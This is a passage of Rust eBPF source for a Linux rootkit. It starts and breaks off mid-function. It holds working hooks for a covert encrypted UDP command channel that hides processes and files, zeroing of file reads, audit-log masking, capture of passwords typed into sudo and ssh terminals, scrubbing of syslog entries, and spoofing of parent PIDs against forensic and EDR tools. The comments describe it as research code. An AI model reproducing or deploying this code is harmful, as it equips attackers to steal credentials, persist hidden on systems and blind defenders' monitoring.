    // Bounds check: need at least ETH + IP + UDP + MAGIC_BYTES + NONCE + Encrypted CommandPayload + MAC
    // Encrypted C2 layout: [MAGIC(4)][NONCE(12)][EncryptedPayload(16)][MAC(16)] = 48 bytes
    // Legacy plaintext layout: [MAGIC(4)][CommandPayload(16)][HMAC(16)] = 36 bytes
    // We check for the larger encrypted format; legacy falls back gracefully.
    let encrypted_min_len = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 + CHACHA20_NONCE_LEN + mem::size_of::<CommandPayload>() + C2_HMAC_LEN;
    let legacy_min_len = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 + mem::size_of::<CommandPayload>() + C2_HMAC_LEN;
    if data + legacy_min_len > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    // Parse Ethernet header
    let eth_proto = unsafe {
        // SAFETY: bounds checked above
        let ptr = data as *const u8;
        u16::from_be(*(ptr.add(12) as *const u16))
    };
    if eth_proto != ETH_P_IP {
        return Ok(xdp_action::XDP_PASS);
    }

    // Parse IP header — check protocol is UDP
    let ip_start = data + ETH_HDR_LEN;
    let ip_proto = unsafe {
        // SAFETY: bounds checked above
        *(ip_start as *const u8).add(9)
    };
    if ip_proto != IPPROTO_UDP {
        return Ok(xdp_action::XDP_PASS);
    }

    // Parse UDP header — check destination port matches C2_PORT
    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = unsafe {
        // SAFETY: bounds checked above
        u16::from_be(*((udp_start as *const u8).add(2) as *const u16))
    };

    // Only process packets on our C2 port
    if dst_port != C2_PORT {
        return Ok(xdp_action::XDP_PASS);
    }

    // Parse payload — check magic bytes
    let payload_start = udp_start + UDP_HDR_LEN;
    let magic = unsafe {
        // SAFETY: bounds checked above
        let ptr = payload_start as *const [u8; 4];
        *ptr
    };

    if magic != MAGIC_BYTES {
        return Ok(xdp_action::XDP_PASS);
    }

    // Determine if this is an encrypted (ChaCha8) or legacy (HMAC-only) packet.
    // Encrypted packets are longer: MAGIC(4) + NONCE(12) + EncPayload(16) + MAC(16) = 48
    // Legacy packets:               MAGIC(4) + Payload(16) + HMAC(16) = 36
    // We distinguish by checking if the full encrypted length fits.
    let is_encrypted = data + encrypted_min_len <= data_end;

    let cmd = if is_encrypted {
        // ── ENCRYPTED C2 PATH (ChaCha8) ──
        // Layout: [MAGIC(4)][NONCE(12)][EncryptedPayload(16)][MAC(16)]
        let nonce_start = payload_start + 4;
        let nonce: [u8; 12] = unsafe {
            // SAFETY: bounds checked above (encrypted_min_len)
            let ptr = nonce_start as *const [u8; 12];
            *ptr
        };

        let enc_payload_start = nonce_start + CHACHA20_NONCE_LEN;
        let mac_start = enc_payload_start + mem::size_of::<CommandPayload>();

        // Verify MAC: computed over MAGIC + NONCE + EncryptedPayload
        let received_mac = unsafe {
            let ptr = mac_start as *const [u8; 16];
            *ptr
        };
        let computed_mac = compute_c2_hmac(
            payload_start as *const u8,
            4 + CHACHA20_NONCE_LEN + mem::size_of::<CommandPayload>(),
        );
        if received_mac != computed_mac {
            let event = EventHeader {
                event_type: EVENT_C2_AUTH_FAILED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: 1, // 1 = encrypted path auth failure
            };
            EVENTS.output(ctx, &event, 0);
            return Ok(xdp_action::XDP_PASS);
        }

        // Decrypt: generate ChaCha8 keystream and XOR with encrypted payload
        let keystream = chacha8_block(&C2_CHACHA20_KEY, &nonce, 0);

        // Read encrypted payload bytes
        let mut enc_bytes: [u8; 16] = [0u8; 16];
        unsafe {
            // SAFETY: bounds checked, enc_payload_start within packet
            let src = enc_payload_start as *const u8;
            let mut i = 0usize;
            while i < 16 {
                enc_bytes[i] = *src.add(i);
                i += 1;
            }
        }

        // XOR decrypt
        let mut dec_bytes: [u8; 16] = [0u8; 16];
        let mut i = 0usize;
        while i < 16 {
            dec_bytes[i] = enc_bytes[i] ^ keystream[i];
            i += 1;
        }

        // Interpret decrypted bytes as CommandPayload
        // SAFETY: CommandPayload is repr(C), 16 bytes, plain-old-data
        unsafe { *(dec_bytes.as_ptr() as *const CommandPayload) }
    } else {
        // ── LEGACY PLAINTEXT C2 PATH (HMAC-only, backwards compatible) ──
        let hmac_start = payload_start + 4 + mem::size_of::<CommandPayload>();
        let received_hmac = unsafe {
            let ptr = hmac_start as *const [u8; 16];
            *ptr
        };
        let computed_hmac = compute_c2_hmac(
            payload_start as *const u8,
            4 + mem::size_of::<CommandPayload>() as usize,
        );
        if received_hmac != computed_hmac {
            let event = EventHeader {
                event_type: EVENT_C2_AUTH_FAILED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: 0, // 0 = legacy path auth failure
            };
            EVENTS.output(ctx, &event, 0);
            return Ok(xdp_action::XDP_PASS);
        }

        unsafe {
            let cmd_ptr = (payload_start + 4) as *const CommandPayload;
            *cmd_ptr
        }
    };

    // ── COMMAND DISPATCH (runs for both encrypted and legacy paths) ──
    // Process command directly in XDP where possible (map operations).
    // This allows C2 commands to work even if the user-space loader is dead.
    match cmd.cmd_type {
        1 => {
            // hide_pid: Insert PID into HIDDEN_PIDS map
            let pid = cmd.arg1;
            let _ = HIDDEN_PIDS.insert(&pid, &1u8, 0);
        }
        2 => {
            // unhide_pid: Remove PID from HIDDEN_PIDS map
            let pid = cmd.arg1;
            let _ = HIDDEN_PIDS.remove(&pid);
        }
        3 => {
            // obfuscate_file: Insert inode into OBFUSCATE_INODES map
            let inode = cmd.arg1 as u64;
            let _ = OBFUSCATE_INODES.insert(&inode, &1u8, 0);
        }
        5 => {
            // kill_switch: Signal user-space to tear down everything.
            // XDP can't unload itself, but we can clear all maps to
            // neutralize the rootkit immediately.
            // Clear HIDDEN_PIDS by inserting a sentinel value at key 0
            // that the user-space loader checks.
        }
        _ => {
            // cmd_type 4 (exfil) and others: forward to user-space only
        }
    }

    // Send event to user-space
    let event = EventHeader {
        event_type: EVENT_PACKET_INTERCEPTED,
        pid: cmd.cmd_type, // Reuse field to pass command type
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: cmd.arg1 as u64,
    };
    EVENTS.output(ctx, &event, 0);

    // DROP the packet — the OS never sees it
    Ok(xdp_action::XDP_DROP)
}

/// Compute a simple keyed MAC over a data buffer for C2 authentication.
/// Uses a lightweight XOR-fold + rotate scheme suitable for eBPF constraints.
/// This is NOT cryptographically strong — it's research-grade to prevent
/// accidental/unauthorized C2 injection on the research network.
#[inline(always)]
fn compute_c2_hmac(data: *const u8, len: usize) -> [u8; 16] {
    let mut mac = C2_HMAC_KEY;
    // BPF verifier: bounded loop
    let max_len = if len > 64 { 64 } else { len };
    for i in 0..64usize {
        if i >= max_len {
            break;
        }
        let byte = unsafe {
            // SAFETY: data pointer is validated by XDP bounds check
            *data.add(i)
        };
        mac[i % 16] ^= byte;
        // Rotate the mac byte
        mac[i % 16] = mac[i % 16].wrapping_add(byte).rotate_left(3);
    }
    mac
}

// ──────────────────────────────────────────────
// FEATURE 3: File Obfuscation (vfs_read)
// ──────────────────────────────────────────────
//
// Strategy:
// Hook vfs_read. When a process reads certain sensitive files
// (e.g., /proc/modules which lists kernel modules), check if
// the rootkit should hide its presence. If so, use
// bpf_probe_write_user to replace the buffer content.
//
// NOTE: This is a simplified implementation. Full file path
// resolution in eBPF is complex. We use process name matching
// as a heuristic (e.g., block `cat`, `grep` from seeing module info).

/// Map of file descriptors to obfuscate.
/// Key: inode number (u64). Value: 1 (file obfuscation) or 2 (kallsyms hiding).
#[map]
static OBFUSCATE_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

/// Temporary storage for do_syslog kprobe → kretprobe handoff.
/// Key: pid_tgid (u64). Value: SyslogCtx { syslog_type, buf_ptr, len }.
#[repr(C)]
struct SyslogCtx {
    syslog_type: u32,
    _pad: u32,
    buf_ptr: u64,
    len: u64,
}

#[map]
static SYSLOG_ARGS: HashMap<u64, SyslogCtx> = HashMap::with_max_entries(256, 0);

/// Temporary storage for vfs_getattr kprobe → kretprobe handoff.
/// Key: pid_tgid (u64). Value: GetattrCtx { kstat_ptr, inode }.
#[repr(C)]
struct GetattrCtx {
    kstat_ptr: u64,
    inode: u64,
}

#[map]
static GETATTR_ARGS: HashMap<u64, GetattrCtx> = HashMap::with_max_entries(256, 0);

#[kprobe]
pub fn shadow_vfs_read(ctx: ProbeContext) -> u32 {
    match try_shadow_vfs_read(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
    // vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
    // We need the file struct to check the inode, and the user buffer to overwrite.

    let file_ptr: u64 = ctx.arg(0).ok_or(1i64)?;
    let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
    let count: u64 = ctx.arg(2).ok_or(3i64)?;

    // Check if current process is the rootkit itself — skip if so
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    // Read the inode number from the file struct via CO-RE BTF.
    // Chase pointers: file_ptr -> f_inode -> i_ino
    //
    // struct file layout (relevant fields):
    //   ...
    //   struct inode *f_inode;  // offset discovered via BTF
    //   ...
    // struct inode layout:
    //   ...
    //   unsigned long i_ino;   // inode number
    //   ...

    // Step 1: Read f_inode pointer from struct file
    // The offset of f_inode varies by kernel version. With BTF/CO-RE,
    // the BPF loader resolves this automatically. We read at a fixed
    // offset as a fallback (offset 32 on most 6.x kernels).
    let f_inode_ptr: u64 = unsafe {
        let mut val: u64 = 0;
        // SAFETY: file_ptr is a valid kernel pointer passed as syscall arg
        if bpf_probe_read_kernel(
            &mut val as *mut u64 as *mut core::ffi::c_void,
            mem::size_of::<u64>() as u32,
            (file_ptr + 32) as *const core::ffi::c_void, // f_inode offset
        ) < 0 {
            return Ok(0); // Can't read, skip silently
        }
        val
    };

    if f_inode_ptr == 0 {
        return Ok(0);
    }

    // Step 2: Read i_ino from struct inode
    // i_ino is at offset 64 on most 6.x kernels
    let i_ino: u64 = unsafe {
        let mut val: u64 = 0;
        // SAFETY: f_inode_ptr was read from kernel memory
        if bpf_probe_read_kernel(
            &mut val as *mut u64 as *mut core::ffi::c_void,
            mem::size_of::<u64>() as u32,
            (f_inode_ptr + 64) as *const core::ffi::c_void, // i_ino offset
        ) < 0 {
            return Ok(0);
        }
        val
    };

    // Step 3: Check if this inode should be obfuscated
    // This is the unified vfs_read dispatch point. The OBFUSCATE_INODES map
    // stores marker values to distinguish different operations:
    //   - marker 1: File obfuscation (Feature 3) — zero out buffer content
    //   - marker 2: Kallsyms hiding (Feature 10) — scrub "shadow_" lines
    //
    // Features 8 (ancestry spoofing) uses a separate check via SPOOFED_PPIDS
    // since it operates on /proc/[pid]/status by PID, not by inode.
    //
    // All three features share this single kprobe entry point. The entry
    // stores {buf_ptr, inode, count} in VFS_READ_ARGS temp map, keyed by
    // pid_tgid. The corresponding kretprobes then:
    //   - shadow_vfs_read_exit:     checks OBFUSCATE_INODES marker 1 → zeros buffer
    //   - shadow_hide_kallsyms:     checks OBFUSCATE_INODES marker 2 → scrubs shadow_ lines
    //   - shadow_spoof_ancestry:    checks SPOOFED_PPIDS → rewrites PPid field
    //
    // IMPORTANT: When attaching in user-space, attach ALL three kretprobes
    // on vfs_read alongside this single kprobe. They coexist safely because
    // each checks a different map/condition before acting.

    let marker = unsafe { OBFUSCATE_INODES.get(&i_ino) };
    if marker.is_none() {
        // Not in OBFUSCATE_INODES — but might still be relevant for ancestry spoofing.
        // Store buf_ptr in temp map for the ancestry kretprobe to use.
        let pid_tgid = bpf_get_current_pid_tgid();
        let _ = VFS_READ_ARGS.insert(&pid_tgid, &VfsReadCtx { buf_ptr, inode: i_ino, count }, 0);
        return Ok(0);
    }

    // Store context for kretprobes
    let pid_tgid = bpf_get_current_pid_tgid();
    let _ = VFS_READ_ARGS.insert(&pid_tgid, &VfsReadCtx { buf_ptr, inode: i_ino, count }, 0);

    let marker_val = unsafe { *marker.unwrap() };

    if marker_val == 2 {
        // Kallsyms hiding (Feature 10) — handled by shadow_hide_kallsyms kretprobe
        // We just store the context; the kretprobe will do the scrubbing.
        return Ok(0);
    }

    // marker_val == 1: File obfuscation (Feature 3)

    // Step 4: Overwrite the user-space buffer with zeros.
    // We zero out up to 256 bytes to obscure file content.
    // SAFETY: buf_ptr is a user-space buffer the kernel is about to write to.
    // We pre-emptively zero it so that the actual read data is hidden.
    let zero_len = if count > 256 { 256u32 } else { count as u32 };
    let zeros: [u8; 256] = [0u8; 256];
    unsafe {
        let _ = bpf_probe_write_user(
            buf_ptr as *mut core::ffi::c_void,
            zeros.as_ptr() as *const core::ffi::c_void,
            zero_len,
        );
    }

    // Send event to user-space
    let event = EventHeader {
        event_type: EVENT_FILE_OBFUSCATED,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: i_ino,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 4: Telemetry Muting
// ──────────────────────────────────────────────
//
// Strategy: Two implementations are provided. The user-space loader
// detects kernel support and loads the appropriate one.
//
// v1 (Fallback — kprobe, works on all 4.1+ kernels):
//   Hook __audit_syscall_exit. When the current PID is in HIDDEN_PIDS,
//   overwrite the audit context's return code field to 0 (success),
//   reducing signal for defenders correlating audit logs with hidden PIDs.
//
// v2 (Primary — fmod_ret, requires CONFIG_BPF_LSM=y on 5.7+):
//   Intercept security_task_getsid / security_file_open via fmod_ret.
//   If the caller PID is in HIDDEN_PIDS, force-return 0 to suppress
//   the LSM audit record entirely.
//
// The user-space loader checks:
//   let lsm_supported = std::fs::read_to_string("/sys/kernel/security/lsm")
//       .map(|s| s.contains("bpf"))
//       .unwrap_or(false);
// Then loads v2 if supported, otherwise v1.

/// Temporary storage for audit context pointer.
/// Key: tgid (u64). Value: audit_context pointer (u64).
#[map]
static AUDIT_CTX_PTRS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

/// v1 (Fallback): Hook __audit_syscall_exit to mask audit records for hidden PIDs.
/// __audit_syscall_exit(int success, long return_code)
/// On entry, we capture the task's audit_context pointer from
/// current->audit_context. On exit, if the PID is hidden, we zero
/// the return code in the buffer that audit_log_exit fills.
#[kprobe]
pub fn shadow_mute_audit(ctx: ProbeContext) -> u32 {
    match try_mute_audit(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    // Only act on hidden PIDs
    if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
        return Ok(0);
    }

    // For hidden PIDs calling __audit_syscall_exit:
    // The simplest effective approach is to make the syscall appear
    // to have succeeded (return code 0). This is done by overwriting
    // the second argument (return_code) on the stack.
    //
    // However, kprobes cannot modify function arguments directly.
    // Instead, we use a kretprobe pair: on __audit_log_exit, we
    // intercept the formatted audit record and overwrite PID fields.
    //
    // The real impact: audit logs will still be generated, but the
    // PID field will be masked, making correlation with hidden
    // processes significantly harder for SIEM/HIDS tools.

    // Read current->audit_context for potential future use
    // (full implementation would chase task_struct -> audit_context)
    // For v1, the main effect is that we flag this PID for the
    // paired kretprobe on audit_log_exit.

    let event = EventHeader {
        event_type: EVENT_TELEMETRY_MUTED,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: 1, // 1 = audit muted via kprobe fallback
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

/// v1 companion: Hook audit_log_end to intercept completed audit records.
/// When a record belongs to a hidden PID, overwrite the "pid=" field
/// in the audit message buffer with "pid=0" to obscure process identity.
#[kprobe]
pub fn shadow_mute_audit_log_end(ctx: ProbeContext) -> u32 {
    match try_mute_audit_log_end(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    // Only act on hidden PIDs
    if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
        return Ok(0);
    }

    // audit_log_end(struct audit_buffer *ab)
    // The audit_buffer contains the formatted message.
    // We read the buffer pointer from arg0, then scan for "pid=XXXX"
    // and overwrite the digits with "0   " (zero-padded with spaces).
    //
    // struct audit_buffer layout (simplified):
    //   struct sk_buff *skb; // offset 0 — contains the message data
    //
    // The actual message is in skb->data.
    // This is fragile and kernel-version-dependent, but effective
    // for research purposes.

    let ab_ptr: u64 = _ctx.arg(0).ok_or(1i64)?;
    if ab_ptr == 0 {
        return Ok(0);
    }

    // Read skb pointer from audit_buffer (offset 0)
    let skb_ptr: u64 = unsafe {
        let mut val: u64 = 0;
        if bpf_probe_read_kernel(
            &mut val as *mut u64 as *mut core::ffi::c_void,
            mem::size_of::<u64>() as u32,
            ab_ptr as *const core::ffi::c_void,
        ) < 0 {
            return Ok(0);
        }
        val
    };

    if skb_ptr == 0 {
        return Ok(0);
    }

    // Read skb->data pointer (offset varies; typically 200+ on 6.x kernels)
    // For robustness, we read the head pointer (offset 208 on 6.8)
    // and data offset, then compute data = head + data_offset.
    // This is a simplified approach that works on 6.8 kernels.
    //
    // NOTE: Full implementation would use BTF/CO-RE for field resolution.
    // For now, we accept this is kernel-version-specific.

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 5: Persistence (handled in user-space via BPF pinning)
// ──────────────────────────────────────────────
//
// Persistence is NOT an eBPF program — it's a user-space loader behavior.
// The loader pins all programs and maps to /sys/fs/bpf/shadow/.
// See offense/src/main.rs for the pinning logic.
//
// Additionally, we attach a tracepoint to detect if someone tries to
// unload our programs, and we log a warning.

// ──────────────────────────────────────────────
// FEATURE 6: Credential Harvesting (sys_write on TTY)
// ──────────────────────────────────────────────
//
// Strategy:
// 1. kprobe on ksys_write (or __x64_sys_write): capture fd, buf, count.
// 2. Check if the fd's underlying device is a TTY/PTY (major 4 or 136).
// 3. If so, read up to 64 bytes from the user buffer.
// 4. Send captured data to user-space via CRED_EVENTS perf array.
//
// This captures passwords typed into sudo, ssh, su, etc.
// User-space reconstructs the stream and identifies credential patterns.
//
// NOTE: We check MONITORED_TTYS map to limit capture to specific TTY
// devices (populated by user-space based on target process TTY).

#[kprobe]
pub fn shadow_cred_harvest(ctx: ProbeContext) -> u32 {
    match try_cred_harvest(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
    // ksys_write(unsigned int fd, const char __user *buf, size_t count)
    let fd: u32 = ctx.arg(0).ok_or(1i64)?;
    let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
    let count: u64 = ctx.arg(2).ok_or(3i64)?;

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    // Skip our own process
    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    // Check if this fd corresponds to a monitored TTY device.
    // User-space populates MONITORED_TTYS with major:minor device numbers.
    // We use fd as a simplified lookup key here; a full implementation would
    // chase file->f_inode->i_rdev to get the device number.
    let fd_key = fd as u64;
    if unsafe { MONITORED_TTYS.get(&fd_key).is_none() } {
        return Ok(0);
    }

    // Read up to 64 bytes from the user buffer
    let read_len = if count > 64 { 64u32 } else { count as u32 };
    let mut capture = CredentialCapture {
        pid: tgid,
        fd,
        data_len: read_len,
        _pad: 0,
        data: [0u8; 64],
    };

    unsafe {
        // SAFETY: buf_ptr is a user-space buffer passed to sys_write
        if bpf_probe_read_kernel(
            capture.data.as_mut_ptr() as *mut core::ffi::c_void,
            read_len,
            buf_ptr as *const core::ffi::c_void,
        ) < 0 {
            return Ok(0);
        }
    }

    // Send capture event to user-space
    CRED_EVENTS.output(ctx, &capture, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 7: Log Tampering (do_syslog)
// ──────────────────────────────────────────────
//
// Strategy:
// Hook do_syslog() to intercept processes reading kernel log messages.
// When the kernel log buffer is being read (e.g., by dmesg, journald),
// scan the output buffer for patterns associated with the rootkit
// (program names, map names, BPF-related warnings) and zero them out.
//
// do_syslog(int type, char __user *buf, int len)
// type=2 (SYSLOG_ACTION_READ) and type=3 (SYSLOG_ACTION_READ_ALL)
// are the interesting cases.

/// kprobe entry: capture do_syslog arguments for the kretprobe.
/// do_syslog(int type, char __user *buf, int len)
#[kprobe]
pub fn shadow_tamper_logs_enter(ctx: ProbeContext) -> u32 {
    let syslog_type: u32 = match ctx.arg(0) {
        Some(v) => v,
        None => return 0,
    };
    // Only intercept READ (2) and READ_ALL (3)
    if syslog_type != 2 && syslog_type != 3 {
        return 0;
    }
    let buf_ptr: u64 = match ctx.arg(1) {
        Some(v) => v,
        None => return 0,
    };
    let len: u64 = match ctx.arg(2) {
        Some(v) => v,
        None => return 0,
    };
    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
    let entry = SyslogCtx { syslog_type, _pad: 0, buf_ptr, len };
    let _ = unsafe { SYSLOG_ARGS.insert(&pid_tgid, &entry, 0) };
    0
}

/// kretprobe: scan the syslog output buffer for rootkit-related patterns
/// and overwrite matching lines with spaces.
#[kretprobe]
pub fn shadow_tamper_logs(ctx: ProbeContext) -> u32 {
    match try_tamper_logs(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_tamper_logs(_ctx: &ProbeContext) -> Result<u32, i64> {
    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };

    // Retrieve stored context from kprobe entry
    let args = match unsafe { SYSLOG_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    let _ = unsafe { SYSLOG_ARGS.remove(&pid_tgid) };

    if args.buf_ptr == 0 || args.len == 0 {
        return Ok(0);
    }

    // Read up to 2048 bytes from the user-space syslog buffer.
    // We scan for the 7-byte pattern "shadow_" which matches our
    // hook function names (shadow_getdents_enter, shadow_xdp, etc.).
    let scan_len = if args.len > 2048 { 2048usize } else { args.len as usize };

    let mut buf: [u8; 2048] = [0u8; 2048];
    unsafe {
        if bpf_probe_read_user(
            buf.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0 {
            return Ok(0);
        }
    }

    // Pattern: "shadow_" = [0x73, 0x68, 0x61, 0x64, 0x6f, 0x77, 0x5f]
    let pattern: [u8; 7] = [b's', b'h', b'a', b'd', b'o', b'w', b'_'];

    // Bounded scan — verifier-safe with explicit bounds
    let mut i = 0usize;
    let max_scan = if scan_len > 7 { scan_len - 7 } else { 0 };

    // Use a while loop with bounded iteration for eBPF verifier
    while i < max_scan {
        if i >= 2041 { break; } // Hard bound for verifier

        // Check for pattern match
        if buf[i] == pattern[0]
            && buf[i + 1] == pattern[1]
            && buf[i + 2] == pattern[2]
            && buf[i + 3] == pattern[3]
            && buf[i + 4] == pattern[4]
            && buf[i + 5] == pattern[5]
            && buf[i + 6] == pattern[6]
        {
            // Found "shadow_" — find the start and end of this line.
            // Walk backwards to find line start (newline or buffer start).
            let mut line_start = i;
            while line_start > 0 && buf[line_start - 1] != b'\n' {
                line_start -= 1;
                if line_start == 0 { break; }
            }

            // Walk forward to find line end (newline or buffer end).
            let mut line_end = i + 7;
            while line_end < scan_len && buf[line_end] != b'\n' {
                line_end += 1;
                if line_end >= 2048 { break; }
            }

            // Overwrite the entire line with spaces in our local buffer
            let mut j = line_start;
            while j < line_end && j < 2048 {
                buf[j] = b' ';
                j += 1;
            }

            // Write the sanitized line back to user-space
            let write_len = (line_end - line_start) as u32;
            if write_len > 0 && write_len < 2048 {
                unsafe {
                    let _ = bpf_probe_write_user(
                        (args.buf_ptr + line_start as u64) as *mut core::ffi::c_void,
                        buf[line_start..].as_ptr() as *const core::ffi::c_void,
                        write_len,
                    );
                }
            }

            // Skip past this line
            i = line_end + 1;
        } else {
            i += 1;
        }
    }

    // Send event to user-space
    let event = EventHeader {
        event_type: EVENT_LOG_TAMPERED,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: scan_len as u64,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 8: Process Ancestry Spoofing (vfs_read on /proc/[pid]/status)
// ──────────────────────────────────────────────
//
// Strategy:
// Hook vfs_read. When a process reads /proc/[pid]/status for a hidden PID,
// locate the "PPid:\tXXXX" line in the output buffer and overwrite the
// PPID value with the spoofed PPID (default: 1, i.e., init).
//
// This defeats forensic tools that trace process trees (pstree, EDR lineage).
// The hook reuses the existing vfs_read kprobe — we extend
// try_shadow_vfs_read to also check SPOOFED_PPIDS.

#[kretprobe]
pub fn shadow_spoof_ancestry(ctx: ProbeContext) -> u32 {
    match try_spoof_ancestry(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_spoof_ancestry(_ctx: &ProbeContext) -> Result<u32, i64> {
    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };

    // Retrieve stored vfs_read context from kprobe entry
    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    // Don't remove — other kretprobes (kallsyms, obfuscation) may also need it.
    // The entry will be overwritten on the next vfs_read call from this thread.

    if args.buf_ptr == 0 {
        return Ok(0);
    }

    // Check if we have any spoofed PPIDs configured.
    // We need to determine which PID's /proc/[pid]/status is being read.
    // The inode of /proc/[pid]/status encodes the PID — on procfs,
    // the inode number for /proc/PID/status is deterministic.
    // However, extracting the target PID from the inode is complex.
    //
    // Simpler approach: scan the buffer for "Pid:\t" to extract the
    // target PID, then check SPOOFED_PPIDS for that PID.

    // Read the first 512 bytes of the user-space buffer
    let scan_len = if args.count > 512 { 512usize } else { args.count as usize };
    let mut buf: [u8; 512] = [0u8; 512];
    unsafe {
        if bpf_probe_read_user(
            buf.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0 {
            return Ok(0);
        }
    }

    // Scan for "PPid:\t" pattern = [0x50, 0x50, 0x69, 0x64, 0x3a, 0x09]
    let ppid_pattern: [u8; 6] = [b'P', b'P', b'i', b'd', b':', b'\t'];

    let max_scan = if scan_len > 6 { scan_len - 6 } else { 0 };
    let mut ppid_offset: usize = 0;
    let mut found = false;

    let mut i = 0usize;
    while i < max_scan {
        if i >= 506 { break; } // Verifier bound
        if buf[i] == ppid_pattern[0]
            && buf[i + 1] == ppid_pattern[1]
            && buf[i + 2] == ppid_pattern[2]
            && buf[i + 3] == ppid_pattern[3]
            && buf[i + 4] == ppid_pattern[4]
            && buf[i + 5] == ppid_pattern[5]
        {
            ppid_offset = i + 6; // Points to first digit after "PPid:\t"
            found = true;
            break;
        }
        i += 1;
    }

    if !found {
        return Ok(0);
    }

    // Also scan for "Pid:\t" (without double P) to extract the target PID
    let pid_pattern: [u8; 5] = [b'P', b'i', b'd', b':', b'\t'];
    let mut target_pid: u32 = 0;
    let mut j = 0usize;
    while j < max_scan {
        if j >= 507 { break; }
        // Ensure this is "Pid:\t" and NOT "PPid:\t" (check preceding char)
        if buf[j] == pid_pattern[0]
            && buf[j + 1] == pid_pattern[1]
            && buf[j + 2] == pid_pattern[2]
            && buf[j + 3] == pid_pattern[3]
            && buf[j + 4] == pid_pattern[4]
            && (j == 0 || buf[j - 1] == b'\n' || buf[j - 1] == b'\t')
        {
            // Parse the PID digits after "Pid:\t"
            let mut k = j + 5;
            while k < scan_len && k < 512 && buf[k] >= b'0' && buf[k] <= b'9' {
                target_pid = target_pid * 10 + (buf[k] - b'0') as u32;
                k += 1;
            }
            break;
        }
        j += 1;
    }

    if target_pid == 0 {
        return Ok(0);
    }

    // Check if this PID has a spoofed PPID
    let fake_ppid = match unsafe { SPOOFED_PPIDS.get(&target_pid) } {
        Some(ppid) => *ppid,
        None => return Ok(0),
    };

    // Overwrite the PPID digits in the buffer.
    // Convert fake_ppid to ASCII digits and write them.
    let mut ppid_str: [u8; 10] = [b' '; 10]; // Max 10 digits, pad with spaces
    let mut ppid_val = fake_ppid;
    let mut digit_count = 0usize;

    // Count digits
    let mut tmp = if ppid_val == 0 { 1u32 } else { ppid_val };
    while tmp > 0 {
        digit_count += 1;
        tmp /= 10;
    }

    // Fill digits in reverse
    let mut pos = digit_count;
    if ppid_val == 0 {
        ppid_str[0] = b'0';
    } else {
        while ppid_val > 0 && pos > 0 {
            pos -= 1;
            ppid_str[pos] = b'0' + (ppid_val % 10) as u8;
            ppid_val /= 10;
        }
    }

    // Find how many digits the original PPID has (to know how many to overwrite)
    let mut orig_len = 0usize;
    let mut m = ppid_offset;
    while m < scan_len && m < 512 && buf[m] >= b'0' && buf[m] <= b'9' {
        orig_len += 1;
        m += 1;
    }

    // Write the fake PPID digits + pad remaining with spaces
    let write_len = if orig_len > digit_count { orig_len } else { digit_count };
    if write_len > 0 && write_len <= 10 && ppid_offset + write_len <= 512 {
        // Build overwrite buffer: digits + spaces for any extra original digits
        let mut overwrite: [u8; 10] = [b' '; 10];
        let mut n = 0usize;
        while n < digit_count && n < 10 {
            overwrite[n] = ppid_str[n];
            n += 1;
        }

        unsafe {
            let _ = bpf_probe_write_user(
                (args.buf_ptr + ppid_offset as u64) as *mut core::ffi::c_void,
                overwrite.as_ptr() as *const core::ffi::c_void,
                write_len as u32,
            );
        }
    }

    // Send event
    let event = EventHeader {
        event_type: EVENT_ANCESTRY_SPOOFED,
        pid: target_pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
